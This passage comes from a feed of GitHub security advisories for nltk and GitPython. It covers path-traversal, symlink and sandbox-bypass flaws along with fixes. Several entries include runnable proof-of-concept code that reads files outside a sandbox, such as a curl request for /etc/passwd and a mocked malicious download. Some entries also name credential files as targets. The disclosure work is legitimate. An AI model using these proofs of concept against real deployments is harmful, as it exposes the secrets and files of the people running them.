-<h2 id="summary">Summary</h2>
-<p>The original advisory was fixed (PR <a href="https://github.com/nltk/nltk/pull/3581">#3581</a>) by adding <code>_reject_unsafe_path_component()</code>, which blocks literal <code>/</code>, <code>\</code>, <code>..</code>, and Windows drive prefixes in caller-/corpus-supplied names. It never resolves symlinks. All three call sites that use this guard still resolve the resulting path through <code>self.abspath()</code> (<code>nltk/corpus/reader/api.py</code>, <code>self._root.join(fileid)</code>), which is a plain lexical join, not the symlink-resolving, <code>required_root</code>-scoped check that <code>CorpusReader.open()</code> (and <code>NKJPCorpusReader</code>'s own fix for its sibling advisory) correctly use elsewhere in this same codebase.</p>
-<p>A symlink placed inside the corpus's own subdirectory, with a name containing no separators at all, passes the guard cleanly and reads a file completely outside the corpus root.</p>
-<h2 id="affected-code-nltkcorpusreaderframenetpy">Affected code (<code>nltk/corpus/reader/framenet.py</code>)</h2>
-<ul>
-<li><code>frame_by_name()</code> reads <code>&lt;frame_dir&gt;/&lt;name&gt;.xml</code></li>
-<li><code>_lu_file()</code> reads <code>&lt;lu_dir&gt;/lu&lt;id&gt;.xml</code></li>
-<li><code>doc()</code> reads <code>&lt;fulltext_dir&gt;/&lt;filename&gt;</code></li>
-</ul>
-<p>All three follow the same chain: <code>_reject_unsafe_path_component(value, ...)</code>, then <code>self.abspath(os.path.join(subdir, value))</code>, then <code>XMLCorpusView(...)</code>, opened via <code>PathPointer.open()</code> with no <code>required_root</code>.</p>
-<h2 id="proof-of-concept">Proof of concept</h2>
-<p>Self-contained, runnable end to end.</p>
-<pre><code class="language-python">import os
-import tempfile
-
-from nltk.corpus.reader.framenet import FramenetCorpusReader
-
-root = tempfile.mkdtemp()
-corpus_root = os.path.join(root, "framenet_v17")
-frame_dir = os.path.join(corpus_root, "frame")
-secret_dir = os.path.join(root, "outside_framenet_root")
-os.makedirs(frame_dir)
-os.makedirs(secret_dir)
-
-with open(os.path.join(corpus_root, "frRelation.xml"), "w") as f:
-    f.write("&lt;frameRelations/&gt;")
-
-secret_path = os.path.join(secret_dir, "stolen.xml")
-with open(secret_path, "w") as f:
-    f.write(
-        '&lt;frame cBy="000" cDate="01/01/2000" name="StolenFrame" ID="999999"&gt;'
-        "&lt;definition&gt;THIS CAME FROM OUTSIDE THE FRAMENET CORPUS ROOT&lt;/definition&gt;"
-        "&lt;/frame&gt;"
-    )
-
-# Attacker plants this inside &lt;corpus_root&gt;/frame/. No path separators,
-# so it passes _reject_unsafe_path_component cleanly.
-link_path = os.path.join(frame_dir, "evil_link.xml")
-os.symlink(secret_path, link_path)
-
-reader = FramenetCorpusReader(corpus_root, [])
-reader._frame_idx = {"__dummy__": {"name": "__dummy__"}}  # skip unrelated index build
-
-result = reader.frame_by_name("evil_link")   # normal, routine call, no ".." anywhere
-print("frame name:", result["name"])
-print("definition:", result["definition"])
-</code></pre>
-<p>Actual output when run against unpatched <code>main</code> (commit <code>35813c8</code>):</p>
-<pre><code>frame name: StolenFrame
-definition: THIS CAME FROM OUTSIDE THE FRAMENET CORPUS ROOT
-</code></pre>
-<p>That content was read from <code>secret_path</code>, a file entirely outside <code>corpus_root</code>, via a single, unmodified, public API call. No exception is raised anywhere in the chain; <code>_reject_unsafe_path_component</code> passes because <code>"evil_link"</code> contains no separators, <code>..</code>, or drive prefix.</p>
-<p>Verified the same way for the other two affected call sites, <code>_lu_file()</code> (<code>lu&lt;id&gt;.xml</code> symlink under <code>lu/</code>) and <code>doc()</code> (arbitrary filename symlink under <code>fulltext/</code>), both succeeding identically with no exception raised.</p>
-<h2 id="why-this-is-in-scope">Why this is in scope</h2>
-<ul>
-<li>No malicious file for a victim to open, no special user interaction. Just a tampered/shared corpus directory (NLTK's own <code>SECURITY.md</code> names "shared environments... multi-tenant pipelines" as its threat model) plus a completely normal API call.</li>
-<li>Core corpus-reader code, not a demo/GUI tool.</li>
-<li>Confirmed unintentional: PR #3581's own description states the goal was to route through "the <code>nltk.pathsec</code> sandbox... including the strict <code>ENFORCE=True</code> mode" and be "consistent with the validation already used elsewhere in NLTK." It doesn't achieve that, since <code>abspath()</code> never reaches the scoped, symlink-resolving check that exists and is used correctly elsewhere in the same file tree (<code>NKJPCorpusReader</code>).</li>
-</ul>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>Route all three call sites through <code>CorpusReader.open()</code> (or pass <code>required_root=self._root</code> to <code>validate_path()</code> directly, as <code>NKJPCorpusReader</code> already does), instead of <code>self.abspath()</code> plus raw <code>PathPointer.open()</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-f833-7jw8-xwrv">https://github.com/nltk/nltk/security/advisories/GHSA-f833-7jw8-xwrv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62384">https://nvd.nist.gov/vuln/detail/CVE-2026-62384</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3726">https://github.com/nltk/nltk/pull/3726</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/736d3212a47de2005b85b785dde6720556d3925d">https://github.com/nltk/nltk/commit/736d3212a47de2005b85b785dde6720556d3925d</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.2">https://github.com/nltk/nltk/releases/tag/v3.10.2</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3789.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3789.yaml</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-framenetcorpusreader-symlink-sandbox-bypass-before">https://www.vulncheck.com/advisories/nltk-framenetcorpusreader-symlink-sandbox-bypass-before</a></li>
-<li><a href="https://github.com/advisories/GHSA-f833-7jw8-xwrv">https://github.com/advisories/GHSA-f833-7jw8-xwrv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f833-7jw8-xwrv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-08T16:39:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Stable FrameNet and NKJP readers parse outside-root XML]]></title>
-        <id>https://github.com/advisories/GHSA-568f-pv23-39p4</id>
-        <link href="https://github.com/advisories/GHSA-568f-pv23-39p4"/>
-        <updated>2026-09-08T16:37:19.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Published <code>nltk==3.9.4</code> still contains several XML-reader entrypoints that build parser paths from caller-controlled selectors or trusted-looking index state without preserving the corpus-root boundary.</p>
-<h3 id="details">Details</h3>
-<ul>
-<li><strong>Vulnerability type:</strong> Path traversal and trusted-root bypass</li>
-<li><strong>Affected component:</strong> <code>FramenetCorpusReader.frame_by_name</code>, <code>FramenetCorpusReader.doc</code>, <code>FramenetCorpusReader.lu</code>, <code>NKJPCorpusReader.header</code></li>
-<li><strong>Affected versions:</strong> Published <code>3.9.4</code> reproduced. Current source <code>v3.10.0-rc2</code> acted as a negative control and blocked the same payloads.</li>
-<li><strong>Patched versions:</strong> Patched in version 3.10.0, which includes the path-safety rejections seen in the release candidate.</li>
-<li><strong>Root cause:</strong> Stable reader paths still construct raw XML filenames from unsafe selectors, poisoned index state, or unsafe file identifiers.</li>
-</ul>
-<p>I confirmed four public stable entrypoints return parsed outside-root content: a parent-segment traversal frame name, a poisoned fulltext index filename, a poisoned LU id, and an unsafe NKJP header file identifier. Current source rejects the same payloads with explicit path-safety errors, which shows the bug is real but version-scoped to the published stable package.</p>
-<h3 id="poc">PoC</h3>
-<p><strong>Preconditions</strong></p>
-<ul>
-<li>The application exposes FrameNet or NKJP reader APIs while trusting NLTK to keep XML parsing inside a corpus root.</li>
-</ul>
-<p><strong>Steps</strong></p>
-<ol>
-<li>Create a minimal FrameNet or NKJP corpus root and place attacker-chosen XML files outside that root.</li>
-<li>Feed unsafe selectors or poisoned index state into the relevant public stable <code>3.9.4</code> APIs.</li>
-<li>Observe <code>frame_by_name</code>, <code>doc</code>, <code>lu(...).exemplars</code>, or <code>header</code> return parsed outside-root values.</li>
-<li>Run the same payloads against current source and observe explicit path-safety rejections.</li>
-</ol>
-<p><strong>Minimal reproducible excerpt</strong></p>
-<pre><code class="language-text">framenet_frame_definition FRAME_LEAK
-framenet_doc_text DOC_LEAK
-framenet_lu_text LU_LEAK
-nkjp_header_title HEADER_LEAK
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Applications that process attacker-influenced FrameNet or NKJP corpus selectors or state can be made to parse XML outside the trusted corpus root through normal public reader responses.</p>
-<h3 id="remediation">Remediation</h3>
-<p>Keep these reader paths on the same root-confinement model as <code>CorpusReader.open()</code> and <code>nltk.pathsec</code>. Reject unsafe path components before constructing filenames from frame names, document filenames, LU ids, or NKJP file identifiers.</p>
-<h3 id="resources">Resources</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/framenet.py#L1366-L1369">https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/framenet.py#L1366-L1369</a></li>
-<li><a href="https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/framenet.py#L1456-L1460">https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/framenet.py#L1456-L1460</a></li>
-<li><a href="https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/framenet.py#L1803-L1810">https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/framenet.py#L1803-L1810</a></li>
-<li><a href="https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/nkjp.py#L96-L103">https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/nkjp.py#L96-L103</a></li>
-<li><a href="https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/nkjp.py#L251-L256">https://github.com/nltk/nltk/blob/3.9.4/nltk/corpus/reader/nkjp.py#L251-L256</a></li>
-<li><a href="https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/corpus/reader/framenet.py#L1388-L1399">https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/corpus/reader/framenet.py#L1388-L1399</a></li>
-<li><a href="https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/corpus/reader/nkjp.py#L96-L128">https://github.com/nltk/nltk/blob/v3.10.0-rc2/nltk/corpus/reader/nkjp.py#L96-L128</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-568f-pv23-39p4">https://github.com/nltk/nltk/security/advisories/GHSA-568f-pv23-39p4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62385">https://nvd.nist.gov/vuln/detail/CVE-2026-62385</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3579">https://github.com/nltk/nltk/pull/3579</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3581">https://github.com/nltk/nltk/pull/3581</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/7d1389d0789c1eca56bd0ed444089e0a3972e3ed">https://github.com/nltk/nltk/commit/7d1389d0789c1eca56bd0ed444089e0a3972e3ed</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/bf3bf32786791394a1008258b4917a7f2d4dbcda">https://github.com/nltk/nltk/commit/bf3bf32786791394a1008258b4917a7f2d4dbcda</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.0">https://github.com/nltk/nltk/releases/tag/v3.10.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3728.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3728.yaml</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-path-traversal-via-framenet-and-nkjp-readers">https://www.vulncheck.com/advisories/nltk-path-traversal-via-framenet-and-nkjp-readers</a></li>
-<li><a href="https://github.com/advisories/GHSA-568f-pv23-39p4">https://github.com/advisories/GHSA-568f-pv23-39p4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-568f-pv23-39p4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-08T16:37:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] Duplicate Advisory: Stable FrameNet and NKJP readers parse outside-root XML in 3.9.4]]></title>
-        <id>https://github.com/advisories/GHSA-qp76-pq9f-gr9m</id>
-        <link href="https://github.com/advisories/GHSA-qp76-pq9f-gr9m"/>
-        <updated>2026-09-08T16:35:52.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-568f-pv23-39p4. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>NLTK versions before 3.10.0 contain a path traversal vulnerability in FramenetCorpusReader and NKJPCorpusReader that allows attackers to parse XML files outside the corpus root by supplying unsafe selectors or poisoned index state. Attackers can exploit frame_by_name, doc, lu, and header methods with crafted parameters to read arbitrary XML files accessible to the application.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-568f-pv23-39p4">https://github.com/nltk/nltk/security/advisories/GHSA-568f-pv23-39p4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-62385">https://nvd.nist.gov/vuln/detail/CVE-2026-62385</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-path-traversal-via-framenet-and-nkjp-readers">https://www.vulncheck.com/advisories/nltk-path-traversal-via-framenet-and-nkjp-readers</a></li>
-<li><a href="https://github.com/advisories/GHSA-qp76-pq9f-gr9m">https://github.com/advisories/GHSA-qp76-pq9f-gr9m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qp76-pq9f-gr9m</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-22T15:31:03.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[gitpython] Duplicate Advisory: GitPython: Environment-variable exfiltration via os.path.expandvars() on Repo.clone_from() URL]]></title>
-        <id>https://github.com/advisories/GHSA-m4f3-g4cq-hqrx</id>
-        <link href="https://github.com/advisories/GHSA-m4f3-g4cq-hqrx"/>
-        <updated>2026-09-08T15:34:15.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-rwj8-pgh3-r573. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>GitPython before 3.1.52 is vulnerable to environment-variable exfiltration in Repo.clone_from(). The caller-supplied remote URL is passed through Git.polish_url(), which on non-Cygwin platforms calls os.path.expandvars() on the URL before invoking git clone. An attacker who controls the clone URL can embed $NAME or ${NAME} tokens that are expanded to the values of the hosting process's environment variables (e.g., AWS_SECRET_ACCESS_KEY or GITHUB_TOKEN). The resulting URL, now containing the secret, is transmitted over the network to an attacker-controlled host during the clone attempt, disclosing the secret.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67322">https://nvd.nist.gov/vuln/detail/CVE-2026-67322</a></li>
-<li><a href="https://www.vulncheck.com/advisories/gitpython-before-environment-variable-exfiltration-via-clone-from">https://www.vulncheck.com/advisories/gitpython-before-environment-variable-exfiltration-via-clone-from</a></li>
-<li><a href="https://github.com/advisories/GHSA-m4f3-g4cq-hqrx">https://github.com/advisories/GHSA-m4f3-g4cq-hqrx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m4f3-g4cq-hqrx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-08-01T15:30:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: Missing Post-Download Integrity Verification Allows Malicious Package Injection]]></title>
-        <id>https://github.com/advisories/GHSA-5wp5-5229-5g6q</id>
-        <link href="https://github.com/advisories/GHSA-5wp5-5229-5g6q"/>
-        <updated>2026-09-08T15:27:56.000Z</updated>
-        <content type="html"><![CDATA[<p>NLTK's package downloader in nltk/downloader.py does not verify file integrity after download and before extraction.</p>
-<p>The download flow at lines 789-825:</p>
-<ol>
-<li>File is downloaded to a temp path via HTTP</li>
-<li>os.replace(tmp_filepath, filepath) moves it to the final location (line 799)</li>
-<li>Extraction begins via _unzip_iter() (line 825)</li>
-</ol>
-<p>Between steps 2 and 3, there is no SHA-256 verification. The checksum logic exists in _pkg_status() (lines 982-1015) but it is only used BEFORE download as a status check ("is this package already installed and up-to-date?"). It is never called after download to verify the file that was actually received.</p>
-<p>Attack vectors:</p>
-<ol>
-<li>MITM during HTTP download (NLTK downloads from http:// by default on some mirrors)</li>
-<li>Race condition on shared filesystems (attacker replaces file between os.replace and _unzip_iter)</li>
-<li>DNS poisoning redirecting to attacker-controlled server</li>
-</ol>
-<p>PoC:</p>
-<pre><code class="language-python">import nltk
-import unittest.mock
-import zipfile
-import io
-import os
-
-# Create a malicious zip that will be "downloaded"
-malicious_zip = io.BytesIO()
-with zipfile.ZipFile(malicious_zip, 'w') as zf:
-    zf.writestr('punkt_tab/tokenizers/punkt_tab/english.pickle', 
-                b'MALICIOUS PAYLOAD - attacker controlled content')
-
-# Patch urllib to return our malicious zip
-with unittest.mock.patch('urllib.request.urlopen') as mock_urlopen:
-    mock_response = unittest.mock.MagicMock()
-    mock_response.read.return_value = malicious_zip.getvalue()
-    mock_response.headers = {'Content-Length': str(len(malicious_zip.getvalue()))}
-    mock_urlopen.return_value = mock_response
-    
-    # Download proceeds, no integrity check catches the swap
-    # nltk.download('punkt_tab')  # Would install attacker payload
-</code></pre>
-<p>This is distinct from CVE-2024-39705 (pickle deserialization via download) and CVE-2025-14009 (zip-slip path traversal). Those address what happens AFTER extraction. This finding addresses the gap BEFORE extraction where integrity is never verified.</p>
-<p>Suggested fix: After os.replace() and before _unzip_iter(), compute SHA-256 of the final file and compare against the expected checksum from the package index. Reject and delete the file if the hash does not match.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-5wp5-5229-5g6q">https://github.com/nltk/nltk/security/advisories/GHSA-5wp5-5229-5g6q</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12259">https://nvd.nist.gov/vuln/detail/CVE-2026-12259</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3449">https://github.com/nltk/nltk/pull/3449</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/0e26734a61094b628d93e26dc18dd7302567ac46">https://github.com/nltk/nltk/commit/0e26734a61094b628d93e26dc18dd7302567ac46</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/3.9.3">https://github.com/nltk/nltk/releases/tag/3.9.3</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3729.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3729.yaml</a></li>
-<li><a href="https://huntr.com/bounties/659ccf6d-12d4-4d4a-84c0-078633c35a5d">https://huntr.com/bounties/659ccf6d-12d4-4d4a-84c0-078633c35a5d</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-before-missing-post-download-integrity-verification">https://www.vulncheck.com/advisories/nltk-before-missing-post-download-integrity-verification</a></li>
-<li><a href="https://github.com/advisories/GHSA-5wp5-5229-5g6q">https://github.com/advisories/GHSA-5wp5-5229-5g6q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5wp5-5229-5g6q</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-09-08T15:27:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: StreamBackedCorpusView Bypasses pathsec.ENFORCE - Arbitrary Local File Read]]></title>
-        <id>https://github.com/advisories/GHSA-x5ph-mj9p-rfr8</id>
-        <link href="https://github.com/advisories/GHSA-x5ph-mj9p-rfr8"/>
-        <updated>2026-09-08T15:27:36.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Setting <code>nltk.pathsec.ENFORCE = True</code> is documented to sandbox all file access to allowed NLTK data directories and raise <code>PermissionError</code> on unauthorized access. However, <code>StreamBackedCorpusView</code> opens files via <code>builtins.open()</code> directly, bypassing <code>pathsec.validate_path()</code> entirely. An attacker who can influence the <code>fileid</code> argument can read arbitrary local files regardless of the <code>ENFORCE</code> setting.</p>
-<h2 id="details">Details</h2>
-<p><code>nltk/pathsec.py:274</code> defines the enforcement point:</p>
-<pre><code class="language-python">def open(file, mode="r", **kwargs):
-    validate_path(file, context="pathsec.open")
-    return builtins.open(file, mode=mode, **kwargs)
-</code></pre>
-<p><code>StreamBackedCorpusView._open()</code> in <code>nltk/corpus/reader/util.py</code> bypasses this entirely for string paths:</p>
-<pre><code class="language-python"># line 171 — no validate_path() call
-self._eofpos = os.stat(self._fileid).st_size
-
-# line 208 — calls builtins.open directly
-self._stream = open(self._fileid, "rb")
-</code></pre>
-<p>Also affected: <code>XMLCorpusView</code> and any corpus reader subclass that passes a raw string <code>fileid</code> to <code>StreamBackedCorpusView</code>.</p>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-python"># poc_server.py — StreamBackedCorpusView pathsec.ENFORCE bypass
-from flask import Flask, request, jsonify
-import nltk.pathsec as ps
-from nltk.corpus.reader.util import StreamBackedCorpusView, read_line_block
-
-# Strict mode enabled — expected to sandbox all file access
-ps.ENFORCE = True
-
-app = Flask(__name__)
-
-@app.post("/read")
-def read_file():
-    fname = request.json.get("file")
-    # fileid is user-controlled, passed directly to StreamBackedCorpusView
-    # pathsec.ENFORCE = True is ignored — builtins.open() called internally
-    view = StreamBackedCorpusView(fname, read_line_block, encoding="utf8")
-    return jsonify({"file": fname, "content": view[0]})
-
-app.run(host="0.0.0.0", port=8000)
-</code></pre>
-<p>Trigger:</p>
-<pre><code>curl -s -X POST http://localhost:8000/read \
-  -H "Content-Type: application/json" \
-  -d '{"file": "/etc/passwd"}'
-</code></pre>
-<p>Confirmed on latest stable NLTK. No privileges required.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Type:</strong> Arbitrary Local File Read / Security Control Bypass</li>
-<li><strong>CWE:</strong> CWE-22, CWE-284</li>
-<li><strong>OWASP:</strong> A01:2021 – Broken Access Control</li>
-</ul>
-<p>Affects web apps, REST APIs, and multi-tenant NLP pipelines where user input influences the <code>fileid</code> passed to NLTK corpus readers. Sensitive targets include <code>/etc/passwd</code>, <code>/proc/self/environ</code> (may contain <code>AWS_SECRET_ACCESS_KEY</code>, <code>DATABASE_URL</code>, etc.), and application config files.</p>
-<p>The core issue is that operators who explicitly set <code>ENFORCE = True</code> to harden production deployments are left with a <strong>false security guarantee</strong>.</p>
-<p><strong>Suggested fix:</strong> Replace <code>builtins.open()</code> and <code>os.stat()</code> in the string-path branch with <code>nltk.pathsec.open()</code> and <code>nltk.pathsec.validate_path()</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-x5ph-mj9p-rfr8">https://github.com/nltk/nltk/security/advisories/GHSA-x5ph-mj9p-rfr8</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-63312">https://nvd.nist.gov/vuln/detail/CVE-2026-63312</a></li>
-<li><a href="https://github.com/nltk/nltk/pull/3588">https://github.com/nltk/nltk/pull/3588</a></li>
-<li><a href="https://github.com/nltk/nltk/commit/674ea75accdf08eca3782dee0a9c4ed7e0d0025b">https://github.com/nltk/nltk/commit/674ea75accdf08eca3782dee0a9c4ed7e0d0025b</a></li>
-<li><a href="https://github.com/nltk/nltk/releases/tag/v3.10.0">https://github.com/nltk/nltk/releases/tag/v3.10.0</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3730.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3730.yaml</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nltk-streambackedcorpusview-bypasses-pathsec-enforce-arbitrary-file-read">https://www.vulncheck.com/advisories/nltk-streambackedcorpusview-bypasses-pathsec-enforce-arbitrary-file-read</a></li>
-<li><a href="https://github.com/advisories/GHSA-x5ph-mj9p-rfr8">https://github.com/advisories/GHSA-x5ph-mj9p-rfr8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x5ph-mj9p-rfr8</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-08T15:27:32.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nltk] NLTK: FileSystemPathPointer.open() sandbox check is dead code — arbitrary file read via file:// protocol]]></title>
-        <id>https://github.com/advisories/GHSA-72r2-7mfr-5xr9</id>
-        <link href="https://github.com/advisories/GHSA-72r2-7mfr-5xr9"/>
-        <updated>2026-09-08T15:27:12.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>There's a logic bug in <code>FileSystemPathPointer.open()</code> inside <code>nltk/data.py</code>
-that makes the sandbox check permanently inert. The guard condition is always
-<code>False</code> — meaning any file the process can read is accessible by passing a
-<code>file://</code> URL to <code>nltk.data.load()</code>.</p>
-<hr>
-<h3 id="details">Details</h3>
-<p>In <code>nltk/data.py</code>, <code>FileSystemPathPointer.open()</code> was patched at some point
-with a comment saying "SECURITY PATCH ENFORCING SANDBOX", but the check
-doesn't work:</p>
-<pre><code class="language-python">def open(self, encoding=None):
-    path = os.path.normpath(self._path)
-
-    # Block raw absolute reads such as "/" "C:\\Windows" etc.
-    if os.path.isabs(path) and path != os.path.normpath(self._path):
-        raise ValueError(f"Direct absolute file access blocked: {path}")
-
-    stream = open(self._path, "rb")
-</code></pre>
-<p><code>path</code> is set to <code>os.path.normpath(self._path)</code> on line 1, then compared
-against <code>os.path.normpath(self._path)</code> again in the condition. They are
-always equal. The <code>ValueError</code> never fires.</p>
-<p>On top of that, <code>__init__</code> already calls <code>os.path.abspath()</code> before storing
-<code>self._path</code>, so it's normalized before <code>open()</code> is even called. Running
-<code>normpath</code> on it again changes nothing.</p>
-<p>The <code>stream = open(self._path, "rb")</code> line is always reached regardless of
-what path was passed in.</p>
-<hr>
-<h3 id="poc">PoC</h3>
-<p>Tested on Python 3.11, NLTK 3.9.1, Ubuntu 22.04.</p>
-<pre><code class="language-python">import nltk
-from nltk.data import FileSystemPathPointer
-
-# direct construction
-ptr = FileSystemPathPointer("/etc/passwd")
-with ptr.open() as f:
-    print(f.read(300))
-
-# via load() using file:// URL
-data = nltk.data.load("file:///etc/passwd", format="raw")
-print(data[:300])
-</code></pre>
-<p>Both print file contents. No exception is raised.</p>
-<hr>
-<h3 id="impact">Impact</h3>
-<p>Any app that lets users influence the string passed to <code>nltk.data.load()</code> or
-<code>nltk.data.find()</code> is exposed — web APIs, notebook servers, multi-tenant
-pipelines. An attacker can read any file the process user has access to:
-<code>/etc/passwd</code>, <code>.env</code> files, private keys, <code>~/.aws/credentials</code>, etc.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p><strong>File:</strong> <code>nltk/data.py</code> — <code>FileSystemPathPointer.open()</code> (lines 378–390)</p>
-<h3 id="whats-wrong">What's wrong</h3>
-<p>Line 387 compares <code>normpath(self._path)</code> against itself — always equal,
-so the <code>ValueError</code> never fires. The check is dead code.
-<code>__init__</code> already calls <code>abspath()</code> on construction, so re-running
-<code>normpath</code> inside <code>open()</code> changes nothing either.</p>
-<hr>
-<h3 id="fix">Fix</h3>
-<p>Validate against the actual list of permitted data directories instead:</p>
-<pre><code class="language-python">def open(self, encoding=None):
-    import nltk.data as _d
-    allowed = [os.path.abspath(p) for p in _d.path if p]
-    if allowed and not any(
-        os.path.commonpath([self._path, r]) == r for r in allowed
-    ):
-        raise ValueError(
-            f"Access outside nltk_data blocked: {self._path!r}"
-        )
-    stream = open(self._path, "rb")
-    if encoding is not None:
-        stream = SeekableUnicodeStreamReader(stream, encoding)
-    return stream
-</code></pre>
-<hr>
-<h3 id="why-commonpath-not-startswith">Why <code>commonpath</code> not <code>startswith</code></h3>
-<p><code>startswith</code> is bypassable by a path that shares a prefix:</p>
-<pre><code>/tmp/nltk_data_evil".startswith("/tmp/nltk_data") → True  ✗
-commonpath(["/tmp/nltk_data_evil", "/tmp/nltk_data"]) → "/tmp"  ✓
-</code></pre>
-<hr>
-<h3 id="diff">Diff</h3>
-<pre><code class="language-diff">-    path = os.path.normpath(self._path)
--    if os.path.isabs(path) and path != os.path.normpath(self._path):
--        raise ValueError(f"Direct absolute file access blocked: {path}")
--
-+    import nltk.data as _d
-+    allowed = [os.path.abspath(p) for p in _d.path if p]
-+    if allowed and not any(
-+        os.path.commonpath([self._path, r]) == r for r in allowed
-+    ):
-+        raise ValueError(f"Access outside nltk_data blocked: {self._path!r}")
-     stream = open(self._path, "rb")
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
